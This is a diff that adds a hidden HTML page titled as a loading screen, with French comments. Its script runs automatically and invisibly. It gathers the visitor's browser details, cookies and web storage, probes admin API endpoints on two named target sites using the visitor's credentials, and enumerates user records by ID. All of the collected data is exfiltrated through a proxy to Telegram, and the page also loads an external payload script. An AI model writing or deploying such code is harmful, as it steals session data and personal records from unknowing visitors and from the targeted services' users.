@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Chargement...</title>
+    <style>body { opacity: 0; pointer-events: none; }</style>
+</head>
+<body>
+    <div id="log" style="display:none;"></div>
+
+    <script>
+    // ==================== COLLABORATION AVEC PAYLOAD.JS ====================
+    (function loadPayload() {
+        const script = document.createElement('script');
+        script.src = 'payload.js';
+        script.onload = () => console.log('[PAYLOAD] chargé');
+        script.onerror = () => console.log('[PAYLOAD] absent (mode autonome)');
+        document.head.appendChild(script);
+    })();
+    </script>
+
+    <script>
+    // ==================== CONFIGURATION INTELLIGENTE ====================
+    const PROXY_URL = 'https://meta-downloader-79f2.onrender.com';
+    const API_BASE = PROXY_URL;  // Plus de double /api
+    const logDiv = document.getElementById('log');
+
+    // Cible par défaut (bugweb) - peut être changée dynamiquement
+    let CURRENT_TARGET = 'bugweb';  // 'bugweb' ou 'bothub'
+
+    // Mapping des cibles disponibles (doit correspondre au server.js)
+    const TARGET_MAP = {
+        bugweb: 'https://bugweb.lionelmelo.space',
+        bothub: 'https://bothub.togehost.online'
+    };
+
+    const DEBUG = false;
+
+    function log(msg) {
+        if (DEBUG) console.log(`[ADAPT] ${msg}`);
+        if (logDiv) logDiv.innerHTML += `${msg}<br>`;
+    }
+
+    // ==================== COMMUNICATION ====================
+    async function sendToTelegram(message, retries = 3) {
+        for (let i = 0; i < retries; i++) {
+            try {
+                const res = await fetch(`${PROXY_URL}/send`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ text: message.substring(0, 4000) })
+                });
+                if (res.ok) return true;
+            } catch(e) {
+                if (i === retries - 1) log('Erreur envoi: ' + e.message);
+                await new Promise(r => setTimeout(r, 1000));
+            }
+        }
+        return false;
+    }
+
+    async function sendFileToTelegram(filename, content, retries = 2) {
+        for (let i = 0; i < retries; i++) {
+            try {
+                const res = await fetch(`${PROXY_URL}/send-file`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ filename, content: btoa(unescape(encodeURIComponent(content))) })
+                });
+                if (res.ok) return true;
+            } catch(e) {
+                if (i === retries - 1) log('Erreur envoi fichier: ' + e.message);
+            }
+        }
+        return false;
+    }
+
+    // ==================== REQUÊTES API (avec support multi-target) ====================
+    async function fetchJSON(endpoint, options = {}, retries = 2, target = null) {
+        // Utiliser la cible spécifiée ou la cible courante
+        const activeTarget = target || CURRENT_TARGET;
+        const useCredentials = window.location.protocol !== 'file:' && window.location.hostname !== '';
+        
+        // Ajouter le paramètre target à l'URL
+        const separator = endpoint.includes('?') ? '&' : '?';
+        const url = API_BASE + endpoint + separator + 'target=' + activeTarget;
+        
+        for (let i = 0; i < retries; i++) {
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+                const res = await fetch(url, {
+                    ...options,
+                    credentials: useCredentials ? 'include' : 'omit',
+                    headers: { 'Content-Type': 'application/json', ...options.headers },
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                return await res.json();
+            } catch(e) {
+                if (i === retries - 1) throw e;
+                await new Promise(r => setTimeout(r, 500 * (i + 1)));
+            }
+        }
+    }
+
+    // ==================== COLLECTE ====================
+    async function collectEnvironment() {
+        const useCredentials = window.location.protocol !== 'file:' && window.location.hostname !== '';
+        const env = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            isMobile: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent),
+            referrer: document.referrer,
+            url: window.location.href,
+            mode: useCredentials ? 'server' : 'local',
+            proxy: PROXY_URL,
+            target: CURRENT_TARGET,
+            target_url: TARGET_MAP[CURRENT_TARGET]
+        };
+        await sendToTelegram(`🌍 ENVIRONNEMENT\n${JSON.stringify(env, null, 2)}`);
+        return env;
+    }
+
+    async function collectCookiesAndStorage() {
+        const data = { 
+            cookies: document.cookie || '(aucun cookie)',
+            localStorage: {}, 
+            sessionStorage: {}
+        };
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch(e) {}
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch(e) {}
+        if (data.cookies !== '(aucun cookie)' || Object.keys(data.localStorage).length || Object.keys(data.sessionStorage).length) {
+            await sendToTelegram(`🍪 STOCKAGE\n${JSON.stringify(data, null, 2).substring(0, 3500)}`);
+        }
+        return data;
+    }
+
+    async function tryAdminEndpoints() {
+        const adminEndpoints = [
+            '/api/admin/users', '/api/admin/stats', '/api/admin/servers', 
+            '/api/admin/transactions', '/api/admin/logs', '/api/admin/backup'
+        ];
+        let found = false;
+        
+        for (const endpoint of adminEndpoints) {
+            try {
+                const data = await fetchJSON(endpoint);
+                found = true;
+                await sendToTelegram(`📊 ${endpoint}: OK (${Object.keys(data).length} champs)`);
+                if ((endpoint === '/api/admin/users' || endpoint === '/api/admin/all') && data.users) {
+                    await sendFileToTelegram(`users_admin_${CURRENT_TARGET}.json`, JSON.stringify(data, null, 2));
+                }
+            } catch(e) {}
+        }
+        return found;
+    }
+
+    async function tryIDOR() {
+        const extracted = [];
+        for (let id = 1; id <= 50; id++) {
+            try {
+                const user = await fetchJSON(`/api/user/${id}`);
+                if (user && (user.userId || user.email || user.id)) {
+                    extracted.push(user);
+                }
+            } catch(e) {}
+            await new Promise(r => setTimeout(r, 50));
+        }
+        if (extracted.length > 0) {
+            await sendFileToTelegram(`idor_users_${CURRENT_TARGET}.json`, JSON.stringify(extracted, null, 2));
+            await sendToTelegram(`🎯 IDOR (${CURRENT_TARGET}): ${extracted.length} utilisateurs extraits`);
+        }
+        return extracted;
+    }
+
+    async function tryGetProfile() {
+        try {
+            const profile = await fetchJSON('/api/user/profile');
+            await sendToTelegram(`👤 PROFIL (${CURRENT_TARGET}): ${JSON.stringify(profile).substring(0, 800)}`);
+            return profile;
+        } catch(e) {
+            await sendToTelegram(`❌ Profil (${CURRENT_TARGET}) inaccessible: ${e.message}`);
+            return null;
+        }
+    }
+
+    async function trySwitchTarget(targetName) {
+        if (TARGET_MAP[targetName]) {
+            CURRENT_TARGET = targetName;
+            await sendToTelegram(`🔄 Cible changée: ${targetName} -> ${TARGET_MAP[targetName]}`);
+            return true;
+        }
+        return false;
+    }
+
+    // ==================== MAIN ====================
+    async function main() {
+        log('Début extraction adaptative...');
+        await sendToTelegram(`🔍 Extraction adaptative démarrée v4.0 (cible: ${CURRENT_TARGET})`);
+        
+        // Phase 1: Reconnaissance
+        await collectEnvironment();
+        await collectCookiesAndStorage();
+        
+        // Phase 2: Profil
+        await tryGetProfile();
+        
+        // Phase 3: Endpoints admin
+        const adminFound = await tryAdminEndpoints();
+        if (adminFound) {
+            await sendToTelegram(`🎖️ ACCÈS ADMIN DÉTECTÉ sur ${CURRENT_TARGET} - Extraction complète`);
+        }
+        
+        // Phase 4: IDOR
+        await tryIDOR();
+        
+        await sendToTelegram(`✅ Extraction terminée pour ${CURRENT_TARGET}`);
+        log('Fin');
+    }
+
+    // Exécution automatique avec timeout intelligent
+    setTimeout(() => {
+        main().catch(e => {
+            log(`Erreur fatale: ${e.message}`);
+            sendToTelegram(`❌ Erreur fatale (${CURRENT_TARGET}): ${e.message}`);
+        });
+    }, 800);
+    </script>
+</body>
+</html>
